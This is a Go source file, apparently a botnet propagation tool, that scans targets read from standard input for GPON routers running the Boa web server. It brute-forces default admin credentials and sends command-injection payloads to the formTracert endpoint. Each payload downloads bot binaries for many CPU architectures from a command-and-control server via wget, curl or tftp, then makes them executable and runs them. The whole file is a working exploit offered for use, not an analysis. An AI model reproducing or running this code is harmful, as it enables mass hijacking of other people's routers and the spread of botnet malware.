/*
Thrown out by bermuda!
*/

package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
	"strconv"
    "math/rand"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var loginsString = []string{"adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:password123"}

// Sémaphore pour limiter les connexions concurrentes
var sem = make(chan struct{}, 1000) // Limite à 1000 connexions concurrentes
var mutex = &sync.Mutex{}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func sendExploit(target string) int {
	// Liste des différents malwares à tester (tous hébergés sur votre serveur C2)
	malwares := []struct {
		name string
		path string
		arch string
		args string // Arguments à passer au malware lors de l'exécution
	}{
		{"bot", "/bot.mips", "mips", "mips"},
		{"bot", "/bot.arm", "arm", "arm"},
		{"bot", "/bot.arm7", "arm7", "arm7"},
		{"bot", "/bot.x86", "x86", "x86"},
		{"bot", "/bot.x86_64", "x86_64", "x86_64"},
		{"bot", "/bot.sh4", "sh4", "sh4"},
		{"bot", "/bot.m68k", "m68k", "m68k"},
		{"bot", "/bot.ppc", "ppc", "ppc"},
		{"bot", "/bot.sparc", "sparc", "sparc"},
	}

	// Serveur C2
	c2Server := "your ip:1337"

	// Essayer chaque malware
	for _, malware := range malwares {
		conn, err := net.DialTimeout("tcp", target, 30 * time.Second)
		if err != nil {
			continue
		}

		// Construire la commande d'exploitation avec wget
		exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/var/tmp/%s%%3Bwget%%20http://%s%s%%20-O%%20->/var/tmp/%s%%3Bchmod%%20777%%20/var/tmp/%s%%3B/var/tmp/%s%%20%s", 
			malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
		
		// Envoyer la requête pour notre serveur C2
		httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
			target, len(exploitCmd)+29, target, target, exploitCmd)

		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		conn.Write([]byte(httpRequest))
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		bytebuf := make([]byte, 512)
		conn.Read(bytebuf)
		conn.Close()
		
		// Essayer aussi avec un autre chemin (/tmp au lieu de /var/tmp)
		conn2, err := net.DialTimeout("tcp", target, 30 * time.Second)
		if err != nil {
			continue
		}
		
		// Construire la commande d'exploitation avec un chemin alternatif
		altPathCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/tmp/%s%%3Bwget%%20http://%s%s%%20-O%%20->/tmp/%s%%3Bchmod%%20777%%20/tmp/%s%%3B/tmp/%s%%20%s", 
			malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)

		// Envoyer la requête avec le chemin alternatif
		altHttpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
			target, len(altPathCmd)+29, target, target, altPathCmd)

		conn2.SetWriteDeadline(time.Now().Add(30 * time.Second))
		conn2.Write([]byte(altHttpRequest))
		conn2.SetReadDeadline(time.Now().Add(5 * time.Second))
		bytebuf2 := make([]byte, 512)
		conn2.Read(bytebuf2)
		conn2.Close()

		// Pause entre les tentatives
		time.Sleep(500 * time.Millisecond)
	}

	// Essayer aussi avec curl au lieu de wget pour chaque malware
	for _, malware := range malwares {
		// Essayer avec curl dans /var/tmp
		conn, err := net.DialTimeout("tcp", target, 30 * time.Second)
		if err == nil {
			exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/var/tmp/%s%%3Bcurl%%20http://%s%s%%20-o%%20/var/tmp/%s%%3Bchmod%%20777%%20/var/tmp/%s%%3B/var/tmp/%s%%20%s", 
				malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
			httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
				target, len(exploitCmd)+29, target, target, exploitCmd)

			conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
			conn.Write([]byte(httpRequest))
			conn.Close()
			time.Sleep(300 * time.Millisecond)
		}
		
		// Essayer avec curl dans /tmp
		conn2, err := net.DialTimeout("tcp", target, 30 * time.Second)
		if err == nil {
			altExploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/tmp/%s%%3Bcurl%%20http://%s%s%%20-o%%20/tmp/%s%%3Bchmod%%20777%%20/tmp/%s%%3B/tmp/%s%%20%s", 
				malware.name, c2Server, malware.path, malware.name, malware.name, malware.name, malware.args)
			altHttpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
				target, len(altExploitCmd)+29, target, target, altExploitCmd)

			conn2.SetWriteDeadline(time.Now().Add(30 * time.Second))
			conn2.Write([]byte(altHttpRequest))
			conn2.Close()
			time.Sleep(300 * time.Millisecond)
		}
	}
	
	// Essayer aussi avec tftp comme méthode alternative de téléchargement
	conn3, err := net.DialTimeout("tcp", target, 30 * time.Second)
	if err == nil {
		tftpCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Btftp%%20-g%%20-r%%20bot.mips%%20%s%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips", 
			c2Server)
		tftpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
			target, len(tftpCmd)+29, target, target, tftpCmd)

		conn3.SetWriteDeadline(time.Now().Add(30 * time.Second))
		conn3.Write([]byte(tftpRequest))
		conn3.Close()
	}

	return 1
}

func sendLogin(target string) int {

	var isLoggedIn int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, 30 * time.Second) // Réduit à 30 secondes
	    if err != nil {
			return -1
	    }

		cntLen = 14
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

	    conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes
	    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Réduit à 30 secondes

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
		    return -1
		}

		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Moved Temporarily") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		// statusLogins est maintenant incrémenté dans processTarget
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return 1
	} else {
		return -1
	}
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=admin&psd=Feefifofum\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
		// Ne pas incrémenter statusFound ici, c'est fait dans processTarget
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {
	// Acquérir le sémaphore
	sem <- struct{}{}
	defer func() {
		// Libérer le sémaphore quand on a terminé
		<-sem
		syncWait.Done()
	}()

	// Vérifier si l'appareil est vulnérable
	if checkDevice(target, 10) == 1 {
		// Incrémenter le compteur de manière thread-safe
		mutex.Lock()
		statusFound++
		mutex.Unlock()
		
		// Tenter de se connecter et d'exploiter
		if sendLogin(target) == 1 {
			mutex.Lock()
			statusLogins++
			mutex.Unlock()
		}
		sendExploit(target)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./fiber [port]")
		os.Exit(1)
	}

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
        for {
            fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
            time.Sleep(1 * time.Second)
            i++
        }
    }()

    // Initialiser le sémaphore
    for i := 0; i < 1000; i++ {
        sem <- struct{}{}
        <-sem
    }

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            target := scan.Text()
            mutex.Lock()
            statusAttempted++
            mutex.Unlock()
            syncWait.Add(1)
            go processTarget(target + ":" + os.Args[1], target)
        }
    }
}
